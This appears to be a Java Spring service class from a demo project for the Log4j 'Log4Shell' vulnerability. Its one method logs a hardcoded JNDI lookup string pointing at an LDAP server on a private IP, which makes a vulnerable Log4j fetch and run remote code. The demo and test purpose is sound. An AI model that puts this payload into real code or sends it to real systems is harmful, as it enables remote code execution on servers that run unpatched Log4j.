package com.winson.springbootlog4jbugdemo;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

/**
 * @author winson
 * @date 2021/12/29
 **/
@Service
public class ExecService {

    public static Logger logger = LoggerFactory.getLogger(ExecService.class);

    public void testLog4JBug(){
        System.out.println("test log4j bug 1");
        logger.info("hello ----> ExecService");
//
        String target = "${jndi:ldap://172.16.2.113:1389/cvywm1}";
        logger.error("test log4j bug ... 1");
        logger.error("params : {}" , target);
        logger.error("test log4j bug ... 3");

        System.out.println("test log4j bug 2");
    }

}
